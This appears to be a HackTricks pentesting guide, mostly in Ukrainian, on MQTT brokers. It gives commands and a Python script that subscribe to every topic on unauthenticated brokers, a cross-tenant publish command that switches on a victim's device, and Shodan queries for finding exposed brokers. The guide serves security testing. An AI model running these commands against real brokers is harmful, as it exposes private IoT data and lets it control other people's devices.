# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Основна інформація

**MQ Telemetry Transport (MQTT)** відомий як **протокол обміну повідомленнями за моделлю publish/subscribe**, що вирізняється крайньою простотою й легкістю. Цей протокол спеціально пристосований для середовищ, де пристрої мають обмежені можливості й працюють у мережах із малою пропускною здатністю, великою затримкою або ненадійними з'єднаннями. Головні цілі MQTT — мінімізувати використання мережевої пропускної здатності та зменшити навантаження на ресурси пристроїв. Окрім того, він спрямований на підтримку надійного зв'язку та забезпечення певного рівня гарантії доставки. Ці завдання роблять MQTT надзвичайно придатним для швидкозростаючої сфери **machine-to-machine (M2M) communication** та **Internet of Things (IoT)**, де важливо ефективно підключати велику кількість пристроїв. Додатково MQTT корисний для мобільних додатків, де економія пропускної здатності та заряду батареї має велике значення.

**Порт за замовчуванням:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Перевірка трафіку

Коли MQTT-брокер отримує пакет **CONNECT**, у відповідь надсилається пакет **CONNACK**. Цей пакет містить код повернення, який є критично важливим для розуміння статусу з'єднання. Код повернення **0x00** означає, що облікові дані були прийняті — це свідчить про успішне з'єднання. Натомість код повернення **0x05** сигналізує, що облікові дані недійсні, і з'єднання не встановлюється.

Наприклад, якщо брокер відхиляє з'єднання через недійсні облікові дані, сценарій виглядатиме приблизно так:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Аутентифікація повністю необов'язкова**, і навіть якщо аутентифікація виконується, **шифрування за замовчуванням не використовується** (облікові дані надсилаються у відкритому вигляді). MITM-атаки все ще можуть бути виконані для викрадення паролів.

To connect to a MQTT service you can use: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) and subscribe yourself to all the topics doing:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Ви також можете використати [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

Також можна використати:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
Або ви можете **запустити цей код, щоб спробувати підключитися до MQTT без authentication, підписатися на всі topic-и й прослуховувати їх**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### The Publish/Subscribe Pattern <a href="#b667" id="b667"></a>

Модель publish/subscribe складається з:

- **Publisher**: публікує повідомлення в одну (або декілька) тем(и) на брокері.
- **Subscriber**: підписується на одну (або декілька) тем(и) на брокері і отримує всі повідомлення, надіслані Publisher.
- **Broker**: маршрутизує всі повідомлення від publishers до subscribers.
- **Topic**: складається з одного або кількох рівнів, розділених косою рискою (наприклад, /smartshouse/livingroom/temperature).

### Packet Format <a href="#f15a" id="f15a"></a>

Кожен MQTT-пакет містить фіксований заголовок (Figure 02). Figure 02: Fixed Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Packet Types

- CONNECT (1): Ініціюється клієнтом для запиту з'єднання з сервером.
- CONNACK (2): Підтвердження сервером успішного з'єднання.
- PUBLISH (3): Використовується для відправки повідомлення від клієнта до сервера або навпаки.
- PUBACK (4): Підтвердження отримання PUBLISH-пакету.
- PUBREC (5): Частина протоколу доставки повідомлень, що гарантує отримання повідомлення.
- PUBREL (6): Подальше підтвердження доставки повідомлення, вказує на звільнення повідомлення.
- PUBCOMP (7): Заключна частина протоколу доставки повідомлень, що вказує на завершення.
- SUBSCRIBE (8): Запит клієнта на підписку для отримання повідомлень з теми.
- SUBACK (9): Підтвердження сервером запиту SUBSCRIBE.
- UNSUBSCRIBE (10): Запит клієнта на відписку від теми.
- UNSUBACK (11): Відповідь сервера на UNSUBSCRIBE-запит.
- PINGREQ (12): Серцева перевірка, відправлена клієнтом.
- PINGRESP (13): Відповідь сервера на heartbeat.
- DISCONNECT (14): Ініціюється клієнтом для завершення з'єднання.
- Два значення, 0 і 15, позначені як reserved і їх використання заборонено.

## IoT MQTT ecosystem attacks: plaintext brokers and topic ACL bypass

Багато споживчих IoT-платформ виставляють MQTT-брокери, які використовуються двома різними ролями:
- Gateway/hub-пристрої, що мостять радіопротоколи (наприклад, BLE/LoRa/Zigbee) в cloud.
- Mobile apps або web backends, які керують пристроями через “app” topics.

Поширені слабкі місця, які можна використати під час pentest:

- Plaintext MQTT через нестандартні порти (наприклад, TCP/8001) замість MQTTS. Будь-який on-path спостерігач може прочитати облікові дані та control frames. Використовуйте Wireshark, щоб помітити cleartext CONNECT/CONNACK та SUBSCRIBE/PUBLISH трафік на незвичних портах.
- Слабкі або відсутні per-tenant topic ACLs. Якщо теми іменуються лише за deviceId (наприклад, "/tenantless/<deviceId>/tx"), будь-який автентифікований користувач може PUBLISH до пристроїв інших tenant'ів.
- Витік чутливих даних через maintenance/admin topics (наприклад, Wi‑Fi credentials, що транслюються в cleartext після змін конфігурації).

Examples (replace placeholders with real values):

Subscribe to potentially sensitive topics with known topic prefixes and device IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
Міжорендаторний контроль, коли ACLs слабкі (publish to another tenant’s device topic):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- MQTT plaintext on non-standard ports є поширеним в IoT. Розгляньте пошук brokers на альтернативних портах і підтвердіть це за допомогою protocol detection.

## Посилання

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
